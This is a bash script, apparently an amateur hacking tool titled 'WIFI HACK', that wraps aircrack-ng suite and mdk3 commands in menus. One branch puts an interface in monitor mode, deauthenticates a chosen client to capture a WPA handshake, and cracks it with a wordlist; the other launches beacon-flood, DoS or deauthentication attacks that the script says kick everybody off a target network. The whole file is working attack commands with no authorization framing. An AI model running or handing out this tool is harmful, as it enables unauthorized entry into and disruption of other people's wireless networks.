#!/bin/bash
clear
echo """

██╗    ██╗    ██╗    ███████╗    ██╗            
██║    ██║    ██║    ██╔════╝    ██║            
██║ █╗ ██║    ██║    █████╗      ██║            
██║███╗██║    ██║    ██╔══╝      ██║            
╚███╔███╔╝    ██║    ██║         ██║            
 ╚══╝╚══╝     ╚═╝    ╚═╝         ╚═╝            
                                                
██╗  ██╗     █████╗      ██████╗    ██╗  ██╗    
██║  ██║    ██╔══██╗    ██╔════╝    ██║ ██╔╝    
███████║    ███████║    ██║         █████╔╝     
██╔══██║    ██╔══██║    ██║         ██╔═██╗     
██║  ██║    ██║  ██║    ╚██████╗    ██║  ██╗    
╚═╝  ╚═╝    ╚═╝  ╚═╝     ╚═════╝    ╚═╝  ╚═╝    
                                                
coded by A Z O | i n s t a : r7jhz1 | snapchat : uur_2v | github : az0122
"""
echo '''
{1} > wifi hacking
{2} > D D o S wifi
'''
read -p '{?} Choose > : ' ch

if [ $ch = 2 ] ; then
echo '''
{1} > wlan0
{2} > other
'''
read -p '{?} Choose > :' ch2

if [ "$ch2" = 2 ] ; then
read -p 'tybe your interface ! : ' in
sudo airmon-ng start "${in}" 
echo '''
!
 !
  !
   !
    !
     !
'''
sudo timeout 9 airodump-ng "${in}mon"
echo '''
!
 !
  !
   !

'''
echo '''Enter the BSSID and CH its up there ^ : 
                                         |
''' 
read -p 'Enter here : ' bss cc
echo '''
choose tybe D D o S you want 

{b} - Beacon flood Mode ! 

{a} - Dos Mode ! this good ^_^

{d} - Deauthentication Kicks everybody ! 

'''
read -p '{?} Choose > : ' t 
echo '## if you want stop just ctrl-c ! ##'
sleep 2
sudo mdk3 "${in}mon" $t -t $bss -c $cc 
sudo airmon-ng stop "${in}mon"
echo ''
else

sudo airmon-ng start wlan0 
echo '''
!
 !
  !
   !
    !
     !
'''
sudo timeout 9 airodump-ng wlan0mon
echo '''
!
 !
  !
   !

'''
echo '''# ! Enter the BSSID and CH its up there  ! : 
                                         
''' 
read -p 'Enter here : ' bss cc
echo '''
choose tybe D D o S you want 

{b} - Beacon flood Mode ! 

{a} - Dos Mode ! this good ^_^

{d} - Deauthentication Kicks everybody ! 

'''
read -p '{?} Choose > : ' t 
echo '## if you want stop just ctrl-c ! ##'
sleep 2
sudo mdk3 wlan0mon $t -t $bss -c $cc
sudo airmon-ng stop wlan0mon
fi
else
# now hacking wifi ! 


echo 'do you have airmon-ng ? ' 

read -p 'Enter [Y/N] : ' ask

if [ $ask = N -o $ask = n ] ;

then

sudo apt-get install airmon-ng ;sudo apt-get update -y;sudo apt-get upgrade -y;sudo apt-get full-upgrade -y; sudo apt-get -f install ; apt-get dist-upgrade
fi
# here chooseing interface


echo '''
{1} > wlan0
{2} > other
'''
read -p '{?} Choose > :' ch1
if [ $ch1 = 2 ] ; then
read -p 'tybe your interface ! : ' i
sudo airmon-ng start $i
sudo timeout 7 airodump-ng "${i}mon"

echo '''
!
 !
  !
   !
    !
     !
'''
read -p '# ! Enter the BSSID and CH for target wifi its up there ! # : ' bssid channel
read -p 'name the handcheck ? :' hand 
sudo timeout 13 airodump-ng --bssid $bssid -c $channel "${i}mon"

echo '''
 !
  !
   !
    !
     !
      !
'''
read -p '# ! Enter the macaddres for the client its down there # !: ' cli
sudo  aireplay-ng -0 3 -a $bssid -c $cli "${i}mon" && sudo timeout 6 airodump-ng --bssid $bssid -c $channel -w $hand "${i}mon" 
echo '''
!
 !
  !
'''
echo 'Enter wordlist !'
read -p 'put it here ! : ' pass
echo 'remember the worldlist file have to be with script ! '
sleep 3
sudo aircrack-ng $hand-01.cap -w $pass
sudo airmon-ng stop "${i}mon"

echo '''

======================================

HAVE FUN ^_^

======================================

coded by A Z O | i n s t a : r7jhz1 | snapchat : uur_2v | github : az0122
'''
exit
else
sudo airmon-ng start wlan0
clear
sudo timeout 8 airodump-ng wlan0mon 

echo '''
!
 !
  !
   !
    !
     !
'''
read -p '# ! Enter the BSSID and CH its up there ! # : ' bssid channel
read -p 'name the handcheck ? :' hand 
sudo timeout 13 airodump-ng --bssid $bssid -c $channel wlan0mon

echo '''
 !
  !
   !
    !
     !
      !
'''
read -p '# ! Enter the macaddres for the client its down there # !: ' cli
sudo aireplay-ng -0 3 -a $bssid -c $cli wlan0mon && sudo timeout 6 airodump-ng --bssid $bssid -c $channel -w $hand wlan0mon 
echo '''
!
 !
  !
'''
echo '# Enter wordlist !'
read -p '# put it here ! : ' pass
echo ''
echo 'remember the worldlist file have to be with script ! '
sleep 3
sudo aircrack-ng $hand-01.cap -w $pass
sudo airmon-ng stop wlan0mon
echo '''

======================================

HAVE FUN ^_^

======================================

coded by A Z O | i n s t a : r7jhz1 | snapchat : uur_2v | github : az0122
'''
exit
fi
fi
